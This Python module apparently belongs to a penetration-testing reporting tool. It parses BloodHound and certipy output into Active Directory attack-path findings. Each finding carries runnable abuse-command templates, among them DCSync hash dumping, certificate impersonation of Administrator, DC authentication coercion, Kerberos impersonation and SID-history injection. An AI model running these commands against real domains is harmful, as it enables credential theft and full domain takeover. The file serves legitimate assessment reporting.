"""Parse BloodHound (legacy + CE) collection output and certipy JSON into
high-value AD attack-path edges — the input to the Ghostwriter forwarder.

BloodHound / SharpHound / bloodhound-python emit per-node JSON (users, groups,
computers, domains, ...) each carrying an `Aces` list of ACL edges. certipy
`find -json` emits per-template `[!] Vulnerabilities` (ESC1-16). We do NOT run a
graph engine — we extract the dangerous edges that are directly present in the
collected objects (the ones that unravel a domain: ForceChangePassword,
GenericAll, WriteDacl, AddKeyCredentialLink, DCSync, AD CS ESC). That covers the
DanglingTree-class chain (alex.o -ForceChangePassword-> jake.h -ESC-> Administrator)
without a Neo4j round-trip.

Accepts a .zip, a directory of *.json, or a single *.json.
"""

from __future__ import annotations

import json
import zipfile
from pathlib import Path

# ACL right -> (severity, ATT&CK tactic, technique, technique_name, abuse hint).
# The abuse hint is a runnable primitive with <placeholders> for the operator.
_ACL_RIGHTS: dict[str, tuple[str, str, str, str, str]] = {
    "forcechangepassword": ("high", "Persistence", "T1098", "Account Manipulation",
        "net rpc password '<target>' '<newpw>' -U '<dom>/<principal>%<pw>' -S <dc-ip>"),
    "genericall": ("critical", "Persistence", "T1098", "Account Manipulation",
        "full control: reset password, add an SPN then Kerberoast, or shadow-creds (pywhisker) -> impersonate"),
    "genericwrite": ("high", "Credential Access", "T1558.003", "Kerberoasting",
        "targeted Kerberoast: write servicePrincipalName then GetUserSPNs -request; or shadow-creds (pywhisker)"),
    "writespn": ("high", "Credential Access", "T1558.003", "Kerberoasting",
        "targeted Kerberoast: targetedKerberoast.py -u <you> -p <pw> --request-user <target> (or bloodyAD set object <target> servicePrincipalName <fake/spn> ; GetUserSPNs -request) -> crack the TGS"),
    "readgmsapassword": ("high", "Credential Access", "T1555", "Credentials from Password Stores",
        "read the gMSA managed password: bloodyAD get object '<gmsa$>' --attr msDS-ManagedPassword (or gMSADumper.py / nxc ldap --gmsa) -> NT hash -> authenticate with -H"),
    "writeproperty": ("high", "Credential Access", "T1558.003", "Kerberoasting",
        "write servicePrincipalName -> targeted Kerberoast, or msDS-KeyCredentialLink -> shadow-creds"),
    "writedacl": ("high", "Persistence", "T1098", "Account Manipulation",
        "grant yourself GenericAll (dacledit / Add-DomainObjectAcl) then abuse it"),
    "writeowner": ("high", "Persistence", "T1098", "Account Manipulation",
        "set owner to yourself (owneredit) -> WriteDacl -> GenericAll"),
    "owns": ("high", "Persistence", "T1098", "Account Manipulation",
        "owner -> WriteDacl -> GenericAll on the target"),
    "allextendedrights": ("high", "Persistence", "T1098", "Account Manipulation",
        "includes ForceChangePassword (reset the target) or DS-Replication on a domain (DCSync)"),
    "addkeycredentiallink": ("critical", "Credential Access", "T1649", "Steal or Forge Authentication Certificates",
        "shadow credentials: pywhisker -a add -> PKINIT with the cert -> the target's NT hash"),
    "addmember": ("high", "Persistence", "T1098", "Account Manipulation",
        "add a controlled principal to the group (net rpc group addmem / bloodyAD add groupMember)"),
    "addself": ("high", "Persistence", "T1098", "Account Manipulation",
        "add yourself (or a controlled computer account) to the group: bloodyAD ... add groupMember <group> <you>"),
    "addallowedtoact": ("critical", "Credential Access", "T1558", "Steal or Forge Kerberos Tickets",
        "RBCD: write msDS-AllowedToActOnBehalfOfOtherIdentity on the target, then getST.py -impersonate administrator -spn cifs/<target>"),
    "writeaccountrestrictions": ("high", "Credential Access", "T1558", "Steal or Forge Kerberos Tickets",
        "write account restrictions -> set RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity), then S4U impersonate"),
}
# Rights that equal domain replication (DCSync) when held over a Domain object.
_DCSYNC_RIGHTS = {"getchangesall", "dcsync", "syncla", "get-changes-all"}


def _norm(s: str) -> str:
    return (s or "").strip().lower()


def _iter_docs(path: str):
    """Yield parsed JSON docs from a zip / dir / single file. Skips unparseable."""
    p = Path(path)
    if not p.exists():
        return
    if p.is_dir():
        files = sorted(p.glob("*.json"))
        for f in files:
            try:
                yield json.loads(f.read_text(encoding="utf-8", errors="replace"))
            except (OSError, json.JSONDecodeError):
                continue
        return
    if p.suffix.lower() == ".zip" or zipfile.is_zipfile(p):
        try:
            with zipfile.ZipFile(p) as z:
                for name in z.namelist():
                    if not name.lower().endswith(".json"):
                        continue
                    try:
                        yield json.loads(z.read(name).decode("utf-8", "replace"))
                    except (json.JSONDecodeError, KeyError):
                        continue
        except (OSError, zipfile.BadZipFile):
            return
        return
    try:
        yield json.loads(p.read_text(encoding="utf-8", errors="replace"))
    except (OSError, json.JSONDecodeError):
        return


def _sid_name_map(docs: list[dict]) -> dict[str, str]:
    """ObjectIdentifier / SID -> display name across every collected object."""
    m: dict[str, str] = {}
    for doc in docs:
        if not isinstance(doc, dict):
            continue
        for obj in doc.get("data") or []:
            if not isinstance(obj, dict):
                continue
            oid = obj.get("ObjectIdentifier") or ""
            props = obj.get("Properties") or {}
            name = props.get("name") or props.get("distinguishedname") or oid
            if oid:
                m[oid] = name
    return m


def _doc_type(doc: dict) -> str:
    meta = doc.get("meta") or {}
    return _norm(meta.get("type") or meta.get("methods") and "" or "")


def _extract_acl_edges(docs: list[dict], sid2name: dict[str, str]) -> list[dict]:
    edges: list[dict] = []
    seen: set[tuple] = set()
    for doc in docs:
        if not isinstance(doc, dict):
            continue
        dtype = _doc_type(doc)
        for obj in doc.get("data") or []:
            if not isinstance(obj, dict):
                continue
            props = obj.get("Properties") or {}
            target = props.get("name") or obj.get("ObjectIdentifier") or "?"
            is_domain = dtype in ("domains", "domain") or (obj.get("ObjectIdentifier", "").count("-") >= 3
                                                           and dtype in ("domains",))
            for ace in obj.get("Aces") or []:
                if not isinstance(ace, dict):
                    continue
                right = _norm(ace.get("RightName"))
                principal = sid2name.get(ace.get("PrincipalSID", ""), ace.get("PrincipalSID", "?"))
                if not right or not principal:
                    continue
                # DCSync (replication over the domain) is the crown-jewel edge.
                if is_domain and right in _DCSYNC_RIGHTS:
                    sig = (principal, "dcsync", target)
                    if sig in seen:
                        continue
                    seen.add(sig)
                    edges.append({
                        "kind": "dcsync", "principal": principal, "right": "GetChangesAll",
                        "target": target, "severity": "critical",
                        "tactic": "Credential Access", "technique": "T1003.006",
                        "technique_name": "DCSync",
                        "abuse": f"secretsdump.py -just-dc '<dom>/{principal}'@<dc-ip>  # DCSync all hashes",
                    })
                    continue
                info = _ACL_RIGHTS.get(right)
                if not info:
                    continue
                sig = (principal, right, target)
                if sig in seen:
                    continue
                seen.add(sig)
                sev, tac, tech, tname, abuse = info
                edges.append({
                    "kind": "acl", "principal": principal, "right": ace.get("RightName"),
                    "target": target, "severity": sev, "tactic": tac,
                    "technique": tech, "technique_name": tname,
                    "abuse": abuse.replace("<target>", str(target)).replace("<principal>", str(principal)),
                })
    return edges


def _extract_certipy_esc(docs: list[dict]) -> list[dict]:
    """AD CS ESC edges from a certipy `find -json` document."""
    edges: list[dict] = []
    for doc in docs:
        if not isinstance(doc, dict):
            continue
        templates = doc.get("Certificate Templates")
        if not isinstance(templates, dict):
            continue
        for tpl in templates.values():
            if not isinstance(tpl, dict):
                continue
            vulns = tpl.get("[!] Vulnerabilities") or tpl.get("Vulnerabilities")
            if not isinstance(vulns, dict) or not vulns:
                continue
            tname = tpl.get("Template Name") or tpl.get("Name") or "?"
            cas = tpl.get("Certificate Authorities")
            ca = (cas[0] if isinstance(cas, list) and cas else cas) or "<CA>"
            for esc, why in vulns.items():
                edges.append({
                    "kind": "adcs_esc", "principal": "<enrollee>", "right": esc,
                    "target": f"{tname} (template) via {ca}", "severity": "critical",
                    "tactic": "Credential Access", "technique": "T1649",
                    "technique_name": "Steal or Forge Authentication Certificates",
                    "why": str(why)[:200],
                    "abuse": (f"certipy req -u <user>@<dom> -p <pw> -ca '{ca}' -template '{tname}' "
                              f"-upn administrator@<dom> -sid <domainSID>-500 ; "
                              f"certipy auth -pfx administrator.pfx -dc-ip <dc-ip>  # -> Administrator NT hash"),
                })
    return edges


# TrustDirection can be an int (0=disabled,1=inbound,2=outbound,3=bidirectional)
# or the string form, across BloodHound versions.
_TRUST_DIR = {0: "Disabled", 1: "Inbound", 2: "Outbound", 3: "Bidirectional",
              "0": "Disabled", "1": "Inbound", "2": "Outbound", "3": "Bidirectional"}


def _extract_trusts(docs: list[dict]) -> list[dict]:
    """Domain trust edges — the pivot for cross-forest lateral movement.
    Bidirectional / inbound trusts (esp. with SID filtering off) let a TGT/TGS
    from one forest be honoured by the other (DarkZero DARKZERO.EXT<->HTB)."""
    edges: list[dict] = []
    seen: set[tuple] = set()
    for doc in docs:
        if _doc_type(doc) not in ("domains", "domain"):
            continue
        for obj in doc.get("data") or []:
            if not isinstance(obj, dict):
                continue
            src = (obj.get("Properties") or {}).get("name") or obj.get("ObjectIdentifier") or "?"
            for tr in obj.get("Trusts") or []:
                if not isinstance(tr, dict):
                    continue
                tgt = tr.get("TargetDomainName") or tr.get("TargetDomainSid") or "?"
                raw = tr.get("TrustDirection")
                direction = _TRUST_DIR.get(raw, str(raw))
                ttype = tr.get("TrustType", "")
                sid_filter = tr.get("SidFilteringEnabled", True)
                # Only trusts that enable an attack path (a direction we can ride
                # + SID filtering off => SID-history / cross-forest ticket reuse).
                attackable = direction in ("Bidirectional", "Inbound") or sid_filter is False
                if not attackable:
                    continue
                sig = (src, tgt, direction)
                if sig in seen:
                    continue
                seen.add(sig)
                sev = "high" if direction == "Bidirectional" or sid_filter is False else "medium"
                edges.append({
                    "kind": "trust", "principal": src, "right": f"{direction} {ttype} trust".strip(),
                    "target": tgt, "severity": sev,
                    "tactic": "Lateral Movement", "technique": "T1482",
                    "technique_name": "Domain Trust Discovery",
                    "why": f"SID filtering {'DISABLED' if sid_filter is False else 'enabled'}",
                    "abuse": (f"cross-forest reuse: capture a TGT/TGS in {src} and present it to {tgt} "
                              f"(nltest /domain_trust ; if SID filtering off -> SID-history injection raiseChild.py / ticketer.py -extra-sid)"),
                })
    return edges


def _extract_delegation(docs: list[dict], sid2name: dict[str, str]) -> list[dict]:
    """Kerberos delegation edges. Unconstrained delegation on a non-DC host is
    the DarkZero DC02 primitive: coerce a DC to auth, capture its TGT, DCSync."""
    edges: list[dict] = []
    seen: set[tuple] = set()
    for doc in docs:
        dtype = _doc_type(doc)
        if dtype not in ("computers", "computer", "users", "user"):
            continue
        for obj in doc.get("data") or []:
            if not isinstance(obj, dict):
                continue
            props = obj.get("Properties") or {}
            name = props.get("name") or obj.get("ObjectIdentifier") or "?"
            if props.get("unconstraineddelegation") is True:
                sig = ("unconstrained", name)
                if sig not in seen:
                    seen.add(sig)
                    edges.append({
                        "kind": "delegation", "principal": name, "right": "Unconstrained delegation",
                        "target": "(any coerced principal, incl. a DC)", "severity": "critical",
                        "tactic": "Credential Access", "technique": "T1558",
                        "technique_name": "Steal or Forge Kerberos Tickets",
                        "abuse": (f"coerce a DC to authenticate to {name} (PetitPotam.py / printerbug.py / "
                                  f"MS-SQL xp_dirtree), harvest the DC TGT with Rubeus monitor / krbrelayx, "
                                  f"then DCSync: secretsdump.py -k -no-pass DOM/'DC$'@dc"),
                    })
            allowed = obj.get("AllowedToDelegate") or props.get("allowedtodelegate") or []
            if allowed:
                spns = ", ".join(str(a) for a in allowed)[:120]
                sig = ("constrained", name)
                if sig not in seen:
                    seen.add(sig)
                    edges.append({
                        "kind": "delegation", "principal": name,
                        "right": "Constrained delegation", "target": spns or "(SPNs)",
                        "severity": "high", "tactic": "Credential Access", "technique": "T1558.003",
                        "technique_name": "Kerberoasting",
                        "abuse": (f"S4U2Self+S4U2Proxy: getST.py -spn {spns.split(',')[0].strip() or '<spn>'} "
                                  f"-impersonate administrator -altservice cifs DOM/{name}:<pw|hash>"),
                    })
    return edges


def extract_edges(path: str) -> list[dict]:
    """Parse a BloodHound collection and/or certipy JSON at `path` into edges.
    Each edge: {kind, principal, right, target, severity, tactic, technique,
    technique_name, abuse, [why]}. Empty list on unreadable/empty input.
    Edge kinds: acl, dcsync, adcs_esc, trust, delegation.
    """
    docs = [d for d in _iter_docs(path) if isinstance(d, dict)]
    if not docs:
        return []
    sid2name = _sid_name_map(docs)
    edges = _extract_acl_edges(docs, sid2name)
    edges.extend(_extract_certipy_esc(docs))
    edges.extend(_extract_trusts(docs))
    edges.extend(_extract_delegation(docs, sid2name))
    # crown jewels first
    order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
    edges.sort(key=lambda e: order.get(e.get("severity"), 9))
    return edges


def edge_signature(edge: dict) -> str:
    return f"{edge.get('kind')}|{edge.get('principal')}|{_norm(edge.get('right'))}|{edge.get('target')}"


def edge_title(edge: dict) -> str:
    if edge["kind"] == "adcs_esc":
        return f"AD CS {edge['right']} — vulnerable template {edge['target']}"
    if edge["kind"] == "dcsync":
        return f"DCSync rights: {edge['principal']} can replicate {edge['target']}"
    if edge["kind"] == "trust":
        return f"Domain trust: {edge['principal']} <-> {edge['target']} ({edge['right']})"
    if edge["kind"] == "delegation":
        return f"Kerberos delegation: {edge['principal']} has {edge['right']}"
    return f"AD ACL abuse: {edge['principal']} --{edge['right']}--> {edge['target']}"


def edge_to_finding(edge: dict, oplog_id: str = "") -> dict:
    """Shape an edge as a Praetor finding dict (consumed by map_reported_finding)."""
    kind = edge["kind"]
    vuln_type = {"adcs_esc": "adcs_esc", "dcsync": "dcsync",
                 "trust": "ad_trust_abuse", "delegation": "kerberos_delegation"}.get(kind, "ad_acl_abuse")
    desc = (f"BloodHound/AD attack-path edge: principal '{edge['principal']}' holds "
            f"'{edge['right']}' over '{edge['target']}'.")
    if edge.get("why"):
        desc += f" ({edge['why']})"
    impact = {
        "adcs_esc": "Enroll a certificate impersonating a privileged principal (Administrator, -500 SID) "
                    "and authenticate as them via PKINIT — full domain compromise.",
        "dcsync": "Replicate the directory to dump every account's NT hash (incl. krbtgt) — "
                  "domain-wide credential compromise and golden-ticket capability.",
        "trust": "Cross-forest/domain lateral movement: a Kerberos ticket from one side is honoured by "
                 "the other; with SID filtering off, inject an extra-SID for privileged access across the trust.",
        "delegation": "Unconstrained delegation lets a coerced privileged account's (e.g. a DC's) TGT be "
                      "captured and replayed — a direct path to DCSync and full domain compromise. "
                      "Constrained/RBCD enables impersonation to the delegated service.",
    }.get(kind, f"Take over '{edge['target']}' via the ACL edge, advancing toward domain compromise.")
    return {
        "id": "",  # filled by caller (bh-NNNN)
        "title": edge_title(edge),
        "severity": edge["severity"].upper(),
        "vuln_type": vuln_type,
        "endpoint": str(edge["target"]),  # non-http -> Ghostwriter network finding type
        "description": desc,
        "impact": impact,
        "remediation": ("Remove the dangerous ACE / restrict template enrollment and set manager-approval; "
                        "tier privileged accounts; monitor for the abuse primitive. "
                        f"Abuse primitive: {edge['abuse']}"),
        "reproduction_steps": [edge["abuse"]],
        "poc_request": edge["abuse"],
        "cwe": "CWE-266" if kind != "adcs_esc" else "CWE-295",
        "status": "confirmed",
        "evidence": {"oplog_id": oplog_id} if oplog_id else {},
    }
